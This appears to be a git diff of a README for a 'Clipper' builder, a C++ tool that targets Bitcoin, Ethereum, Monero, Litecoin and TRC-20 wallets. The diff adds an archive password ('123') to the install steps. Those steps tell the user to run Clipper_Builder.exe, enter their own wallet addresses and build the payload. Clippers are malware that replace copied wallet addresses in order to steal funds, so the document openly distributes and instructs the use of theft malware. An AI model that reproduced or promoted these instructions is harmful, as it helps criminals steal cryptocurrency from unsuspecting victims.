@@ -5,10 +5,12 @@ Made in C++. Made in C++. Supports Bitcoin, Ethereum, Monero, Litecoin and TRC-2
 
 # How to install:
 
-1. Run Clipper_Builder.exe
-2. Enter your addresses.
-3. Сlick on the build button.
-4. Ok, it's ready. Your build will be saved to the "Release" folder. "Clipper folder\Release"
+1. The password for the archive is - 123
+2. Run Clipper_Builder.exe
+3. Enter your addresses.
+4. Сlick on the build button.
+5. Ok, it's ready. Your build will be saved to the "Release" folder. "Clipper folder\Release"
+
 
 
 # How the Clipper Works:
